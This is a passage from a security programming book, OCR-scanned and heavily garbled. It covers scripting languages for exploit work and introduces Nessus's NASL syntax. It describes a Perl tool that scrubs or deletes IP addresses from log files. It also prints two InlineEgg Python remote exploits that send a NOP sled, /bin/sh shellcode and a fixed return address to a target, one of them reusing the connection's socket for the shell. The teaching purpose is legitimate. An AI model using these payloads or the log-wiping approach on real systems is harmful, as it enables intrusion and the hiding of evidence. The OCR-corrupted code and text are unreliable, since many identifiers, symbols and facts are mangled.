script now writes the temporary log file to the actual log file. Once complete, the log 
file is closed. 
At lines 61 through 77, the script replaces every IP address in the file with a random 
IP address. It performs this in similar fashion to the previous two instances of string 
replacement. 
At line 67, a random IP is generated similar to the first replacement. Now at line 68, 
the search function looks for any IP address using ((\d+)\.('d+)\.(\d+)\.(\d+)). The W+ rep-
resents a digit plus zero or more digits. In this case, we look for at least one digit fol-
lowed by a period followed by at least one digit, and so on until a full IP address is built. 
That IP is now capable of being replaced by the random IP generated. 
At lines 73 through 76, the log file is freed for usage, and then written over with the 
temporary log. 
At line 81, the script checks to see if the -d argument was passed. This argument 
deletes any line with the specified IP address in the log file. 

Security Coding • Chapter 1 
55 
The file is opened at line 83, and a similar traversal While loop (previously used in 
the replacement arguments) is used to traverse the lines in the file.The main difference 
lies in lines 88 through 91. If the line has any character pattern containing the IP 
address, the loop skips the push of the current line and continues to the next line in the 
file. All lines that do not contain the IP address are included in the temporary log file, 
while all lines that do contain the IP address are excluded. 
The log file is then overwritten with the temporary log file in lines 98 through 101. 
At lines 102 through 117, the subscript usage (a form of function within a script) is 
defined. Usage is called in instances where incorrect parameters are passes or the -Si 
(help) flag is set. The subscript is a series of print statements defining the usage of Logz. 
At lines 118 through 135, randomip and nmn are defined.These subscripts are used to 
generate the random IPs used by various replacement arguments used by Logz. The sub-
script num creates a random number between 11 and 241 at line 133. The random 
number is then passed on to the calling function random ip. Randomip calls mini four 
times in order to form the four octets of an IP address. Once all four numbers are cre-
ated in lines 122 through 125, they are placed into an IP address string called total on 
line 127.This string is returned to fill in the replacement IP for the various arguments 
that require it. 
Python 
Python was invented by Guido Van Rossum in 1990. Its first "official" version was pub-
lished in 1991. Named by Van Rossum for his interest in the Monty Python movies, 
Python initially did nor gain the same heavy supporr as Perl. Over time, however, the 
advocate count grew, and the coinp.laitg.python tisenet group was founded in 1994. Unlike 
GNU, Python was originally released completely "free;" no stated or implied license 
accompanied it. 
Just as with almost every other scripting language, one of the main goals of 
Python was rapid application development. As an interpreted language, Pyrhon requires 
an accompanying interpreter for script execution. At the time of publishing, two main 
interpreters existed for Python.The following sites contain detailed documentation on 
both interpreters and provide mechanisms for free downloads: 
• 
www.python.org 
• 
www.activestate.com 
Python scripts can be written and executed on a long list of operating systems, 
including the gamut of Microsoft Windows platforms and numerous flavors of UNIX, 
Linux, and Mac. 
Python is an object-oriented scripting language that provides the ability to create 
and use objects, classes, and their methods. Easy to embed and extend with other lan-
guages, it was designed to avoid ambiguity. Overall, Python is an extremely powerful lan-
guage that is favored by companies such as Information Security, Bioinformatics, and 
Applied Mathematics.This popularity is accredited to the easy development application 

56 
Chapter 1 • Security Coding 
program interface (API), the ability to code low-level processes, the performance, and 
the socket design. 
NOTE 
CANVAS, a security tool written by Dave Aitel, is quickly gaining popularity. It 
uses Python as the interpreter and scripting syntax for the exploit scripts it con-
tains. CANVAS houses a collection of exploits that can be executed to see your 
"true security risk." Information and source code for CANVAS can be found at 
www.immunitysec.com. CANVAS is completely open source if you purchase at 
least one user license. 
InlineEgg 
InlineEgg was created by researchers at CORE SDI, to help develop a dynamic and 
extendable exploit framework for its product suite. It creates shellcode for multiple 
syscalls on multiple platforms that can be quickly utilized within Python scripts. Hands-
down, CORE SDI's implementation of shell creation is the market-leading technology. 
Example 1.30 is pulled from InlineEgg's documentation, which was created by CORE 
SDI engineers to help you understand how Python can be effective in commercial-
grade applications. 
"~M"' Example 1.30 InlineEgg 
1 
from inlineegg.inlineegg import * 
2 
import socket 
3 
import struct 
4 
import sys 
5 
6 
de£ stdinShellEgg[): 
7 
* 
egg = InlineEgg IFreeBSDxftesyscall) 
8 
if egg <= InlineEgg (OpenB5D;x:86Syscal it 
9 
egg = InlineEgg(LinuxxB6Syseall) 
10 
1 1 
egg.setuid(G> 
12 
egg.setgidlO) 
13 
egg.execve('/bin/shH
 t i 'bash', '-i")) 
14 
15 
print "Egg len: %dM % len(egg) 
16 
return egg 
17 
18 def main!) : 
19 
if len(sys.argv) < 3: 
20 
raise Except ion, "Usage: %s <: target ip> < tar get port>" 
21 
22 
sock - socket.socket(socket.AF_IHETP 
socket,SOCK_STREAM) 
23 
sock , connect ( (sys^argvLU , int (sySnargv^l J ) ) 
24 
25 
egg = stdinShellEgg1 ] 
26 
27 
retAddr = struct .packr^L1 ,0xbf£f£c24L) 

Security Coding • Chapter 1 
28 
toSend 
= " \x9CP* 11024-lenlegg) ) 
29 
toSend + = egg.getCode I) 
30 
toSend += retAddr*20 
31 
32 
sock.send{eoSend} 
33 
34 
main() 
Analysis 
Line 1 imports the inlineefig class from the iiilincegfi file needed to execute the script. 
Lines 2 through 4 import other required yet standard classes for Python. 
Lines 6 through 16 are used to create the function that creates the egg that will be 
used in the script. Line 16 returns the generated egg when the function is called. Lines 7 
through 9 execute inlineegfi functions called from the inliiicegg class that was imported on 
line 1, to grab the generated egg from the main code base. Lines 11 and 12 grab the 
code to set the user ID and group ID, respectively, followed by Line 13, which adds the 
execve syscali to the egg. 
Lines 19 and 20 do a quick job of verifying that the usage parameters were passed 
correctly by checking to see how many were passed. Note that there is no error 
checking conducted on these parameters. 
Lines 22 and 23 create and connect to the socket via the IP address and port 
number provided to the program via the command-line parameters passed during exe-
cution. 
Line 25 creates the egg to send to the remote target. 
Lines 27 through 30 create the packet with the egg that gets sent to the target 
system. Line 2H informs the script of the filler characters that should be used in addition 
to the egg, as seen with the \x90. 
Line 32 writes the packet to the socket, while line 34 calls the main function and 
launches the program. 
Now that you have become familiar with the InlineEgg API, we are going to tackle 
another example that is a bit more complicated. Example 1.31 uses a combination of 
techniques to generate the appropriate shellcode embedded within a looping condition. 
Example 1.31 InlineEgg II 
1 from inlineegg,inlineegg import * 
2 import socket 
3 
import struct 
4 
import sys 
5 
6 def reuseConnectionShellEggJ}i 
7 
ti 
egg = InlineEgg(FreeBSDxEGSyscall) 
5 
* 
egg = InlineEgg(OpenBSDx86Syscall) 
9 
egg - InlineEgg(LinuxxSSSyscall) 
10 
11 
ft s = egg.socket(2,l) 
12 
» egg.connectls, C127.0.0.1\3334n 
13 
14 
sock = eggTsave(-l} 

58 
Chapter 1 • Security Coding 
15 
16 
# Start Looping 
17 
loop = egg.EoO 
18 
loop.addCodelloop.micro.inc(sock)) 
19 
lenp = loop. save {0) 
20 
err = loop.getpeername{sock,0,lenp.addr()) 
21 
loop.Whileterr, 
'!=', 0) 
22 
23 
# Dupping an Exec 
24 
egg-dup2(sock, 0) 
25 
egg.dup2(sock, 1) 
26 
egg.dup2(sock, 2) 
27 
egg.execvef'/bin/sh',{ bash','-i')) 
28 
print "Egg len: %d" % lentegg) 
29 
return egg 
30 
31 
mainO : 
32 
if len(sys.argv) < 3: 
33 
raise Exception, "usage: %s <target ip> <target port>" 
34 
35 
sock = socket.socket(socketTAF_INET\ socket,SOCK_STREAM) 
36 
sock.connect((sys.argv[lJ, int fsys.argv(2]))] 
37 
8 
egg = reuseConnectionShellEggf) 
39 
40 
retAddr = struct. pack[ •<!>•, Oxbffffc24L) 
41 
toSend = "\x90"*(1024-lenleggH 
42 
toSend += egg.getCode() 
43 
toSend += retAddr*20 
44 
45 
sock.send(toSend) 
46 
47 main () 
Analysis 
Line 1 imports the itilineegg class from the inlhiecgg file needed to execute the script. 
Lines 2 through 4 import other required yet standard classes for Python. 
Lines 7 through 9 execute iniineegg functions called from the iiitiiieegg class that was 
imported on line 1, to grab the generated egg from the main code base. 
Lines 11 and 12 were included on the local system for testing purposes only If 
uncommented, it will attempt to connect the script to the loopback address on port 
3334. 
Line 14 creates a variable on the stack initialized to zero; this will come in handy 
when scanning for the correct socket. 
Lines 17 through 21 create a looping structure to look for the socket (line 17), add 
the appropriate code to it once it is found (line 18), initialize the correct error code 
(line 20), and finally implement the entire loop in line 21. 
Lines 24 through 29 specify what syscalh should be added to the egg using the inU-
neegfi class imported at the beginning of the script. Line 28 prints the egg to STDOUT, 
then the egg is returned to Main on line 29. 

Security Coding • Chapter 1 
59 
Lines 31 through 33 do a quick job of verifying the usage parameters that were 
passed correctly by checking to see how many were passed. Note that there is no error 
checking conducted on these parameters. 
Lines 35 and 36 create and connect to the socket via the IP address and port 
number provided to the program via the command-line parameters passed during exe-
cution, 
Line 38 creates the egg to send to the remote target. 
Lines 41 through 43 create the packet with the egg that gets sent to the target 
system. Line 41 informs the script of the filler characters that should be used in addition 
to the egg, as seen with the \x90. 
Line 45 writes the packet to the socket, while line 47 calls the main function and 
launches the program. 
N 
NOTE 
^
For more information on any of the syscalls used within these two scripts, 
please refer to Chapter 7, "Writing Portable Network Code," and Chapter 8, 
"Shellcode Techniques." 

60 
Chapter 1 • Security Coding 
Summary 
Understanding programming languages is essential to finding vulnerabilities and writing 
exploit code. A programmer attempting to write a buffer overflow exploit for a Java pro-
gram is wasting his or her time. Likewise, understanding how a programming language 
interacts with the underlying system is vital to writing shellcode.To this end, this chapter 
combines basic programming instruction with the characteristics of four common pro-
gramming languages. 
Each of the languages discussed in this chapter has its own unique strengths and weak-
nesses. All four languages share features including data types and basic programming con-
cepts such as functions and loops. While decades old, C is still a useful language. This 
simple, efficient language may be used to quickly create powerful programs. For this 
reason, vulnerability exploit code is frequently written in C, as are programs designed to 
interact with the U N I X operating system. Newer languages such as Java and C# (along 
with the .NET framework) provide portability and modern security features. Classes and 
functions may be marked "private," and data hiding is made simple. Automatic garbage col-
lection provides protection against coding bugs and memory leaks. Programming languages 
can render entire classes of vulnerabilities obsolete. With automatic array boundary 
checking, Java and C# protect against stack and heap overflows. 
While this is a step in the right direction, no programming language can ever ensure 
the security of all programs written in it. Web application programmers must continue 
to study all input and output, limiting characters to those that are essential to the func-
tioning of the application. Interactions with back-end databases must be audited so that 
Structured Query Language (SQL) commands cannot be injected. 
Perl and Python are powerful, popular, and useful scripting languages. Other popular 
scripting languages include Ruby, U N I X C/Korn/13ourn Shell, VBScript, and SQL. 
There are many advantages to using a scripting language versus an interpreted program-
ming language for program development, but the main drivers usually revolve around 
speed-to-development and ease-of-use. In general, scripts are much faster to create 
owing to the interpreter advantages that many compilers lack. String manipulation and 
socket usage are two of the most popular features of Perl and Python. The demand for 
I string matching or comparison and manipulation has motivated the sophisticated regular 
expression engines present in most of the more advanced scripting languages. These fea-
tures allow the end user to create scripts that have the ability to parse large amounts of 
s data and conduct analysis on said data with rhe goal of generating intelligent output. 
Scripting languages help you to quickly automate mundane and redundant tasks. 
Any time a task is done more than once per day, you should consider whether that task 
would be easier to completely automate in script; you might even want to automate the 
execution of that script via an embedded time control. 
www.syngress.com 

Security Coding * Chapter 1 
61 
Solutions Fast Track 
C/C++ 
0 
C and C++are compiled languages that currently dominate the software 
development world in terms of popularity and footprint. 
0 
C code encompasses nearly all of the publicly available exploit code in 
addition to nearly every major vulnerability and network-scanning program to 
include Networked Messaging Application Protocol(NMAP) and Nessus. 
Java 
0 Java supports multi-threading, so a Java program may perform multiple tasks 
simultaneously. The thread class in the Java.lang package provides threading 
functionality. 
0 
Objects, or instances of a class, may contain data that should not be altered by 
methods outside of the class. Programmers using C++ may "hide" data by 
designating certain variables ''private." 
c# 
0 
C# has an abundance of features that make it enticing for security, "hacker," 
and development professionals alike and is increasing in popularity. Its security 
sandbox and execution restrictions are similar to Java's. 
Perl 
0 
Perl is one of the world's and the security industry's most popular scripting 
languages as seen and determined by the number of unique scripts that have 
been coded with it. 
0 
Two functions automatically included within Perl are match and subst. Match 
takes two arguments: the first is the string you want to search within and the 
second is the pattern you are looking for. The substitution function, also 
known as subst, takes the same two initial parameters, but replaces the pattern 
with the supplied substitution string. 

62 
Chapter 1 • Security Coding 
Python 
k 
0 
Python has recently started to become popular, especially in terms of exploit 
and exploit tool development. 
0 
Popular tools such as Core Security Technologies' Inline Egg suite and 
Immunity Security's CANVAS have major components written in Python. 
Links to Sites 
For more information on topics covered in this chapter, please visit the following Web 
sites: 
www.gnu.org/software/gcc/gcc.html The GNU C Compiler home page is a 
good online reference for C languages and programming specifics. 
www.research.att.com/~bs/C++.html The AT&T Research page on C++, 
maintained by its creator, Bjarne Stroustrup, has good documentation and some 
excellent example code. 
http://java.sun.eom/features/l998/05/birthday.html Sun Microsystem's page 
has a good starter for Java documentation. 
http://java.sun.com/docs/books/tutorial/java/nutsandbolts/datatypes.html 
A 
good Sun Microsystem reference for Java data types. 
http://java.sun.eom/products/jdk/l.2/docs/api/java/net/ 
URLConnection.html This site contains JDK's documentation, which pro-
vides usage details for the URL connection class. 
www.csharphelp.com/archives/archivel89.html This site includes good infor-
mation on C# and its security features. 
www.linuxgazette.com/issue85/ortiz.html This site is a top-of-the-line refer-
ence for C# and data types. 
WWW.perl.org Perl's main page contains documentation, example scripts, and 
online tutorials. 
www.activestate.com Activestate has the worlds most popular Windows Perl 
interpreter. It is freely available with corresponding documentation at 
ww w. a cti vesta te. c oni. 
WWW.python.org Python's homepage contains documentation, scripts, and 
tools. 
www.syngress.com 

Security Coding * Chapter 1 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Q: If I want to customize a scripting language, which one is the easiest to extend? 
A: Most scripting languages are easy to extend. All things considered, Perl would 
probably be the easiest to extend, followed by Python, then Javascript. Language 
extensions can come in a variety of formats, but most commonly, these exten-
sions get implemented through libraries or modules that are parsed during script 
execution or runtime.The main difference between extending languages is the 
potential increase in memory during each script execution cycle. 
Ql Why is it so difficult to replicate raw socket support within scripting languages? 
A: Scripting languages are designed to be easy and quick programming tools, at the 
expense of some functionality. First and foremost, the scripts do not need to be 
compiled and they generally do not reference specific locations or addresses in 
memory. The socket functionality implemented within most of these languages is 
geared for the masses, not the "super techies" who want to modify specific flags 
within a Transmission Control Protocol (TCP) or User Datagram Protocol 
(UDP) packet. Most socket implementations allow you to merely customize the 
payload field, and in general, there is nearly no support for IP packet creation or 
even raw Mandatory Access Control (MAC) creation. 
Ql Should I use recursion or iteration? 
A: Recursion and iteration are functionally equivalent. All recursive functions can be 
written iteratively and vice versa. In most situations, programmers choose the 
method that intuitively solves the problem. However, when speed is essential, 
iteration is generally faster than recursion. Recursive functions require multiple 
function or method calls, each of which has overhead not found when iterating. 
Q: Can I program my own cryptographic algorithm? 
Al Don't. It is extremely difficult to develop algorithms that are cryptographically 
secure. Public scrutiny is required over a period of years before an algorithm 
www.syngress.com 

fc 
64 
Chapter 1 • Security Coding 
should be trusted to protect sensitive information. Use the cryptographic pack-
ages that come with the language that you are programming in, or use a com-
mercial tool that has withstood public inspection. 
Q: How does someone create a programming language? 
A: The first step in creating a programming language is to develop a syntax that 
specifies keywords and acceptable characters and words. A context-free grammar 
specifies the structure of a language. A common form of representing a grammar 
is Backus-Naur Form (BNF). Finally, a compiler is developed, which implements 
the language specified in the grammar. 
What are reference variables and how do they differ from pointers? 
Pointers are actually stored memory addresses. In C, a programmer uses the & 
character to access the memory location directly. This implementation requires 
interactions with the underlying hardware. The primary advantage of reference 
variables is ease-of-use. Developers do not have to be concerned with accessing 
sensitive areas of memory with simple programming errors. In addition, refer-
ence variables can be preferred when a reference to a structure is needed. 
www.syngress.com 

Chapter 2 
NASL Scripting 
Solutions in this Chapter: 
• 
Introduction 
• 
NASL Script Syntax 
• 
Writing NASL Scripts 
• 
NASL Scripts 
• 
Porting to and from NASL 
Related Chapters: Chapter 1, Chapter 13 
El Summary 
0 Solutions Fast Track 
0 Frequently Asked Questions 
65 
* 
*
! 

Chapter 2 • NASL Scripting 
Introduction 
Nessus is a free, powerful, up-to-date, and easy-to-use remote security scanner that is 
used to audit networks by assessing the security strengths and weaknesses of each host, 
scanning for known security vulnerabilities, 
Nessus Attack Scripting Language (NASL) provides users with the ability to write 
their own custom security auditing scripts. For example, if an organization requires every 
machine in the administrative subnet to run OpenSSH version 3.6.1 or later on port 
22000, a simple script can be written to run a check against the appropriate hosts. 
NASL was designed to allow users to share their scripts. When a buffer overflow is 
discovered on a server, someone inevitably writes a NASL script to check for that vul-
nerability. If the script is coded properly and submitted to the Nessus administrators, it 
becomes part of a growing library of security checks that are used to look for known 
vulnerabilities. However, just like many other security tools, Nessus is a double-edged 
sword. Hackers and crackers can use Nessus to scan networks, so it is important to audit 
networks frequently. 
The goal of this chapter is to teach you how to write and code proper NASL scripts 
that can be shared with other Nessus users. It also discusses the goals, syntax, and devel-
opment environment for NASL scripts as well as porting C/C++ and Perl code to 
NASL and porting NASL scripts to other languages. 
History 
Nessus was written and is maintained primarily by Renaud Deraison.The NASL main 
page has the following excerpt about the history of the project: 
"NASL comes from a private project called "pkt_forge," which was 
written in late 1998 by Renaud Deraison and which was an interactive 
shell to forge and send raw IP packets (this pre-dates Perl's Net::RawlP 
by a couple of weeks). It was then extended to do a wide range of 
network-related operations and integrated into Nessus as "NASL." 
The parser was completely hand-written and a pain to work with. In 
mid-2002, Michel Arboi wrote a bison parser for NASL, and he and 
Renaud Deraison re-wrote NASL from scratch. Although the "new" 
NASL was nearly working as early as August 2002, Michel's laziness 
made us wait for early 2003 to have it working completely." 
NASL2 offers many improvements over NASL1. It is considerably faster, has more 
functions and more operators, and supports arrays. It uses a bison parser and is stricter 
than the hand-coded parser used in NASL1. NASL2 is better at handling complex 
expressions than NASL1. Any reference to "NASL" in this chapter refers to "NASL2." 
Goals of NASL 
The main goal of nearly all NASL scripts is to remotely determine if vulnerabilities exist 
on a target system. 

NASL Scripting • Chapter 2 
67 
Simplicity and Convenience 
NASL was designed to permit users to quickly and easily write security tests. To this 
end, NASL provides convenient and easy-to-use functions for creating packets, checking 
for open ports, and interacting with common services such as Hypertext Transfer 
Protocol (HTTP), File Transfer Protocol (FTP), and Telnet. NASL also supports HTTP 
over Secure Sockets Layer (SSL [HTTPS]). 
Modularity and Efficiency 
NASL makes it easy for scripts to piggyback onto work that has already been done by 
other NASL scripts.This capability is provided primarily through the Nessus "knowl-
edge base." When Nessus is run, each NASL script submits its results to a local database 
to be used by subsequent scripts (e.g., one NASL script might scan a host for FTP ser-
vice and submit the list of ports on which the service was found to the database. If one 
instance of the FTP service is found on port 21 and another instance is discovered on 
port 909, the Services/FTP value would be equal to 21 and 909. If a subsequent script 
designed to identify "Jason's Magical FTP Server" were called gct_kb_itcm (Services/FTP), 
the script would automatically be run twice, once with each value.This is much more 
efficient than running a full Transmission Control Protocol (TCP) port scan for every 
script that wants to test the FTP service. 
Safety 
Because NASL scripts are shared between users, the NASL interpreter must offer a guar-
antee regarding the safety of each NASL script. NASL guarantees the following two 
very important items: 
• 
Packets will not be sent to any host other than the target 
• 
Commands will not be executed on the local system 
These two guarantees make downloading and running other users' NASL scripts 
safer than downloading and running arbitrary code. However, the scripts are designed to 
discover, and in some cases exploit, services running on the target host; therefore, some 
scripts carry the risk of crashing the service or the target host. Scripts downloaded from 
ticssns.org are placed into one of nine categories indicating whether the script gathers 
information, disrupts a service, attempts to crash the target host, and so on. Nessus users 
can pick and choose which categories are permitted to run. 
NASL's Limitations 
It is important to realize the limitations of NASL; it is not an all-purpose scripting lan-
guage designed to replace Perl or Python. There are several things that can be done in 
industrial-grade scripting languages that cannot be done in NASL. Although NASL is 
very efficient and heavily optimized for use with Nessus, it is not the fastest language. 
Michael Arboi maintains that NASL2 is up to 16 times faster than NASLl at some tasks. 

68 
Chapter 2 • NASL Scripting 
NASL Script Syntax 
This section provides a descriptive overview of NASL script syntax, written to help the 
reader write his or her own NASL scripts. For a complete discussion of the NASL 
syntax, including a formal description of NASL grammar, please refer to "The NASL2 
Reference Manual" by Michel Arboi, 
Comments 
Text following a # character is ignored by the parser. Multi-line comments (e.g., C's /* 
*/) and inline comments are not supported. 
Example of a valid comment: 
x = 1 
# set x equal to 1 
Examples of invalid comments: 
# Author; Syngress 
Filename; example.nasi # 
port = get_kb_item # read port number from KB # ("Services/http") 
Variables 
The variables in NASL are very easy to work with. They do not need to be declared 
before being used and variable-type conversion and memory allocation and de-alloca-
tion are handled automatically As in C, NASL variables are case-sensitive. 
NASL supports the following data types: integers, strings, arrays, and NULL. 
Booleans are implemented, but not as a stand-alone data type. NASL does not support 
floating-point numbers. 
Integers 
There are three types of integers: decimal (base 10), octal (base 8), and hexadecimal (base 
16). Octal numbers are denoted by a leading 0 (zero) and hexadecimal numbers are 
denoted by a leading Ox (zero x) sequence. Therefore, 0x10 = 020 = 16 integers are 
implemented using the native C inl type, which is 32 bits on most systems and 64 bits 
on some systems. 
Strings 
Strings can exist in two forms: pure and impure. Impure strings are denoted by double 
quotes, and escape sequences are not converted.The internal string function converts 
impure strings to pure strings by interpreting escape sequences, denoted by single 
quotes. For example, the firing function would convert the impure string City\tState to 
the pure string CityXState. 
NASL supports the following escape sequences: 

NASL Scripting • Chapter 2 
69 
\« New line character 
V I lorizontal tab 
\v Vertical tab 
\r Line feed character 
y" Form feed character 
V Single quote 
\" Double quotes 
\x41 is A, \x42 is B, and so on 
\x00 does not parse correctly 
Tips and Tricks. 
Common End-of-line Sequences 
A long time ago, a computer called the "Teletype Model 33" was constructed 
using only levers, springs, punch cards, and rotors. While this machine was 
capable of producing output at a rate of 10 characters per second, it took two-
tenths of a second to return the "print" head to the beginning of a new line. Any 
characters printed during this interval would be lost as the "read" head traveled 
back to the beginning of the line. To solve this problem, the Teletype Model 33 
engineers used a two-character sequence to denote the end of a line, a carriage 
return character to tell the read head to return to the beginning of the line, and 
a new line character to tell the machine to scroll down a line. 
Early digital computer engineers realized that a two-character, end-of-line 
sequence wasted valuable storage. Some favored carriage return characters {\r or 
\xOd), some favored new line characters (\n or \xOa)r and others continued to use 
both. 
Following are some common consumer operating systems and the end-of-
line sequences used by each: 
• 
Microsoft Windows uses the carriage return and line feed characters 
(\r\n). 
• 
UNIX uses the new line or \n character. 
• 
Macintosh OS 9 and earlier uses the carriage return or \r character. 
Macintosh OS X is a blend of traditional Mac OS and UNIX and uses either 
\r or \n, depending on the situation. Most UNIX-style command-line utilities in OS 
X use \n while most Graphical User Interface (GUI) applications ported from OS 9 
continue to use\r. 

Chapter 2 • NASL Scripting 
Arrays 
NASL provides support for two types of array structures: standard and string. Standard 
arrays arc indexed by integers, with the first element of the array at index 0. String-
indexed arrays, also known as hashes or associative arrays, allow you to associate a value 
with a particular key string; however, they do not preserve the order of the elements 
contained in them. Both types of arrays are indexed using the /) operator. 
It is important to note that if you want to index a large integer, NASL has to allo-
cate storage for all of the indices up to that number, which may use a considerable 
amount of memory. To avoid wasting memory, convert the index value to a string and 
use a hash instead. 
NULL 
NULL is the default value of an unassigncd variable that is sometimes returned by 
internal functions after an error occurs. 
The isnullQ function must be used to test whether or not a variable is NULL. 
Directly comparing values with the NULL constant (var == NULL) is not safe because 
NULL will be converted to 0 or "" (the empty string) depending on the type of the 
variable. 
The interaction between NULL values and the array index operator is tricky. If you 
attempt to read an array element from a NULL variable, the variable becomes an empty 
array. The example given in the NASL reference is as follows: 
V = NULL; 
# isnullfv) returns TRUE and typeof(v) returns "undef" 
x = v[2]; 
# isnullfx) returns TRUE and typeof(x} returns "undef 
# But isnull{v) returns FALSE and typeof(v) returns "array" 
Bookans 
Booleans are not implemented as a proper type. Instead, TRUE is defined as 1 and 
FALSE is defined as 0. Other types are converted to TRUE or FALSE (0 or 1) following 
these rules: 
• 
Integers are TRUE unless they are 0 or NULL. 
• 
Strings are TRUE if non-empty; therefore, 0 is TRUE, unlike Ferl and NASL1. 
• 
Arrays are always TRUE, even if they are empty. 
• 
NULL (or an undefined variable) evaluates to FALSE. 
Operators 
NASL does not support operator overloading. Each operator is discussed in detail 
throughout the following section. 

NASL Scripting • Chapter 2 
71 
General Operators 
The following operators allow assignment and array indexing; 
• 
= is the assignment operator, x = y copies the value of y into x. In this 
example, if y is undefined,* becomes undefined.The assignment operator can 
be used with all four built-in data types. 
• 
[] is the array index operator. Strings can be indexed using the array index 
operator. If you set name — Nessus, then name[1] is c. Unlike NASL1, NASL2 
does not permit you to assign characters into a string using the array index 
operator (i.e., naiucjl j — "E" will not work). 
Comparison Operators 
The following operators are used to compare values in a conditional and return either 
TRUE or FALSE. The comparison operators can safely be used with all four data types. 
• 
== is the equivalency operator used to compare two values. It returns TRUE 
if both arguments are equal; otherwise it returns FALSE. 
• 
.'= is the not equal operator, and returns TRUE when the two arguments are 
different; otherwise it returns FALSE. 
• 
> is the greater than operator. If used to compare integers, the returned results 
are as would be expected. Using > to compare strings is a bit trickier because 
the strings are compared on the basis of their American Standard Code for 
Information Interchange (ASCII) values. For example, (a < b),(A < fc),and (A 
< B) are all TRUE but (a < B) is FALSE. This means that if you want to make 
an alphabetic ordering, you should consider converting the strings to all upper-
case or all lowercase before performing the comparison. Using the greater than 
or less than operators with a mixture of strings and integers yields unexpected 
results. 
• 
>= is the greater than or equal to operator. 
* 
< is the less than operator. 
• 
<= is the less than or equal to operator. 
A rith m etic Opera to rs 
The following operators perform standard mathematic operations on integers. As noted 
later in this chapter, some of these operators behave differently, depending on the types 
of parameters passed to them. For example, + is the integer addition operator, but can 
also perform string concatenation. 
• 
+ is the addition operator when both of the passed arguments are integers. 
• 
- is the subtraction operator when both of the passed arguments are integers. 
• 
* is the multiplication operator. 

72 
Chapter 2 • NASL Scripting 
• 
/ i s the division operator, which discards any fractional remainder (e.g., 20 I 6 
==3). 
• 
NASL does not support floating-point arithmetic. 
• 
Division by 0 returns 0 rather than crashing the interpreter. 
• 
% is the modulus operator. A convenient way of thinking about the modulus 
operator is that it returns the remainder following a division operation.(e.g., 20 
%6== 
2). 
• 
If the second operand is NULL, 0 is returned instead of crashing the inter-
preter. 
• 
** is the power (or exponentiation) function (e.g., 2 * * 3 == 8). 
String Operators 
String operators provide a higher-level string manipulation capabihty.Thcy concatenate 
strings, subtract strings, perform direct string comparisons, and perform regular expres-
sion comparisons. The convenience of built-in operators combined with the functions 
described in the NASL library make handling strings in NASL as easy as handling them 
in PHP or Python. Although it is still possible to manipulate strings as if there were 
arrays of characters (similar to those in C), it is no longer necessary to create and edit 
strings in this manner. 
• 
+ is the string concatenation (appending) operator. Using the "string" function 
is recommended in order to avoid ambiguities in type conversion. 
• 
- is the string subtraction operator, which removes the first instance of one 
string inside another (e.g., Ncsstts — ess would return Nns). 
• 
[j indexes one character from a string, as described previously (e.g., If str = 
Nessus then strjOJ is N. 
• 
>< is the "string match" or "substring" operator. It will return T R U E if the 
first string is contained within the second string (e.g., us >< Nessus is TRUE). 
• 
>.'< is the opposite of the >< operator. It returnsTRUE if the first string is 
not found in the second string. 
• 
=~ is the regular expression-matching operator. It returns T R U E if the string 
matches the supplied regular expression, and FALSE if it does not. ,<; =— 
jabej+zzz is functionally equivalent to ereg(striug:s, pattern: jabc]+zzz, icasc.l). 
• 
.'~ is the regular expression-mismatching operator. It returnsTRUE when the 
supplied string does not match the given regular expression, and false when it 
does. 
• 
=~ and J~ will return NULL if the regular expression is not valid. 

NASL Scripting • Chapter 2 
73 
Logical Operators 
The logical operators return TRUE or FALSE, which are defined as / and 0, respec-
tively, depending on the relationship between the parameters. 
• 
/is the logical not operator. 
• 
&& is the logical and operator. It returns TRUE if both of the arguments eval-
uate to TRUE.This operator supports short-circuit evaluation, which means 
that if the first argument is FALSE the second is never evaluated. 
• 
I I is the logical or operator. It returns TRUE if either argument evaluates to 
TRUE. This operator supports short-circuit evaluation, which means that if the 
first argument is TRUE the second is never evaluated. 
Bitwise Operators 
Bitwise operators are used to compare and manipulate integers and binary data at the 
single bit level. 
• 
"is the bitwise not operator. 
• 
& is the bitwise and operator. 
• 
| is the bitwise or operator. 
• 
'is the bitwise xor (exclusive or) operator, 
• 
<< is the logical bit shift to the left. A shift to the left has the same effect as 
multiplying the value by 2 (e.g., x « 2 is the same as x * 4), 
• 
>> is the arithmetic / signed shift to the right. The sign bit is propagated to 
the right; therefore, x » 2 is the same as x / 4. 
• 
>>> is the logical / unsigned shift to the right. The sign bit is discarded (e.g., 
if x is greater than 0, then x >» 2 is the same as x I 4. 
C-like Assignment Operators 
C-like assignment operators have been added to NASL for convenience. 
• 
++ and — NASL supports the incrementing and decrementing operators. + + 
increases the value of a variable by 1, and decreases the value of a variable by 
/.There are two ways to use each of these operators. 
• 
When used as a postfix operator (e.g., x++ or x—) the present value of the 
variable is returned before the new value is calculated and stored. For example: 
X 
= 
5 ; 
d i s p l a y (xH x++H x) i 
• 
This code will print 556, and the value of x after the code is run is 6. 
x = 5; 
display (x, x--, x); 

74 
Chapter 2 • NASL Scripting 
• 
This will display 554, and the value of x after the code is run is 4. 
• 
The incrementing and decrementing operators can also be used as prefix oper-
ators (for example, ++x or —x). When used this way, the value is modified 
first and then returned. For example: 
X = 5; 
display (x, ++x, x) : 
• 
This code will print 566, and the value of x after the code is run is 6. 
x = 5; 
display (x, —x, x) ; 
• 
This code will display 544, and the value of .v after the code is run is 4. 
• 
NASL also provides a convenient piece of syntactic shorthand. It is common to 
want to do an operation on a variable and then assign the result back to the 
variable. If you want to add 10 to x, you could write: 
x = x + 10; 
• 
As shorthand, NASL allows you to write: 
x += 10; 
• 
This adds 10 to x's original value and assigns the result back to .v.This shorthand 
works for all of the operators listed above: +•, -, *, /, %, «. », and >>>. 
Control Structures 
"Control structures" is a generic term used to describe conditionals, loops, functions, and 
associated commands such as return and break. These commands allow you to control the 
flow of execution within your NASL scripts. NASL supports the classic if-then-else state-
ment, but not case or switch statements. Loops in NASL include for, foreach, while, and 
repeat-until. Break statements can be used to prevent a loop from iterating, even if the 
loop conditional is still true. NASL also uses built-in functions and user-defined func-
tions, both of which use the return statement to pass data back to the caller. 
"if" Statements 
NASL supports if and else constructs, but does not support cIscif.You can recreate the 
functionality of elseifot elifin NASL by chaining together //"statements. 
